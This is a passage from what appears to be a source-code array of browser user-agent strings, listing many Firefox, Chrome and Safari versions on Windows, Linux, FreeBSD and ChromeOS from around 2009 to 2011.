'Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ar; rv:1.9.2) Gecko/20100115 Firefox/3.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ca; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1) Gecko/20090624 Firefox/3.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 4.0.20506)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 ( .NET CLR 3.5.30729; .NET4.0C)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.16) Gecko/20101130 AskTbMYC/3.9.1.14019 Firefox/3.5.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.3) Gecko/20121221 Firefox/3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-AU; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.3) Gecko/20100401 Firefox/3.6;MEGAUPLOAD 1.0',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532+ (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.596.0 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.19 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.638.0 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.654.0 Safari/534.17',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1) Gecko/20090612 Firefox/3.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1) Gecko/20090612 Firefox/3.5 (.NET CLR 4.0.20506)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 FirePHP/0.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 (.NET CLR 3.5.30729) FBSMTWB',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C) FirePHP/0.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.2) Gecko/20100316 AskTbSPC2/3.9.1.14019 Firefox/3.6.2',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.5.3;MEGAUPLOAD 1.0 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3pre) Gecko/20100405 Firefox/3.6.3plugin1 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100806 Firefox/3.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b1) Gecko/20091014 Firefox/3.6b1 GTB5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.3a3pre) Gecko/20100306 Firefox3.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:2.0b10) Gecko/20110126 Firefox/4.0b10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.0 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; et; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB7.0',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; hu; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; hu; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; hu; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:1.9.2.8) Gecko/20100722 AskTbADAP/3.9.1.14019 Firefox/3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ja; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; lt; rv:1.9.2) Gecko/20100115 Firefox/3.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; nl; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; pl; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; pl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-BR; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-PT; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ro; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; rv:1.9.2) Gecko/20100105 MRA 5.6 (build 03278) Firefox/3.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; sl; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; uk; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-TW) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-TW; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20090402 Firefox/3.6a1pre',
'Mozilla/5.0 (Windows; Windows NT 5.1; es-ES; rv:1.9.2a1pre) Gecko/20090402 Firefox/3.6a1pre',
'Mozilla/5.0 (X11; Arch Linux i686; rv:2.0) Gecko/20110321 Firefox/4.0',
'Mozilla/5.0 (X11; FreeBSD i686) Firefox/3.6',
'Mozilla/5.0 (X11; FreeBSD x86_64; rv:2.0) Gecko/20100101 Firefox/3.6.12',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.14 Safari/534.24',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.702.0 Chrome/12.0.702.0 Safari/534.24',
'Mozilla/5.0 (X11; Linux i686; rv:2.0) Gecko/20100101 Firefox/3.6',
'Mozilla/5.0 (X11; Linux i686; rv:2.0b10) Gecko/20100101 Firefox/4.0b10',
'Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20100101 Firefox/4.0b12pre',
'Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20110204 Firefox/4.0b12pre',
'Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.04 Chromium/11.0.696.0 Chrome/11.0.696.0 Safari/534.24',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
'Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62',
'Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4',
'Mozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9pre',
'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre',
'Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339',
'Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339 Safari/534.10',
'Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.341 Safari/534.10',
'Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.343 Safari/534.10',
'Mozilla/5.0 (X11; U; CrOS i686 0.9.130; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.344 Safari/534.10',
'Mozilla/5.0 (X11; U; DragonFly i386; de; rv:1.9.1) Gecko/20090720 Firefox/3.5.1',
'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.0.10) Gecko/20090624 Firefox/3.5',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.1) Gecko/20090703 Firefox/3.5',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.2.9) Gecko/20100913 Firefox/3.6.9',
'Mozilla/5.0 (X11; U; FreeBSD i386; ja-JP; rv:1.9.1.8) Gecko/20100305 Firefox/3.5.8',
'Mozilla/5.0 (X11; U; FreeBSD i386; ru-RU; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux AMD64; en-US; rv:1.9.2.3) Gecko/20100403 Ubuntu/10.10 (maverick) Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux MIPS32 1074Kf CPS QuadCore; en-US; rv:1.9.2.13) Gecko/20110103 Fedora/3.6.13-1.fc14 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux armv7l; en-GB; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.6.11',
'Mozilla/5.0 (X11; U; Linux armv7l; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2.14) Gecko/20110224 Firefox/3.6.14 MB860/Version.0.43.3.MB860.AmericaMovil.en.MX',
'Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1) Gecko/20090624 Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.576.0 Safari/534.12',
'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.634.0 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5',
'Mozilla/5.0 (X11; U; Linux i686 (x86_64); fr; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (X11; U; Linux i686; ca; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.2.8) Gecko/20100725 Gentoo Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1) Gecko/20090624 Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1) Gecko/20090624 Ubuntu/8.04 (hardy) Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090722 Gentoo Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6 GTB7.0',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100914 SUSE/3.6.10-0.3.1 Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100915 Ubuntu/9.10 (karmic) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc13 Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.13) Gecko/20101209 CentOS/3.6-2.el5.centos Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.15) Gecko/20110330 CentOS/3.6-1.el5.centos Firefox/3.6.15',
'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux i686; en-CA; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.15) Gecko/20101027 Fedora/3.5.15-1.fc12 Firefox/3.5.15',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB5',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6 GTB6',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.2.11) Gecko/20101013 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12 GTB7.1',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16',
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:2.0) Gecko/20110404 Fedora/16-dev Firefox/4.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.551.0 Safari/534.10',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.579.0 Safari/534.12',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.44 Safari/534.13',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.84 Safari/534.13',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/9.10 Chromium/9.0.592.0 Chrome/9.0.592.0 Safari/534.13',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.612.1 Safari/534.15',
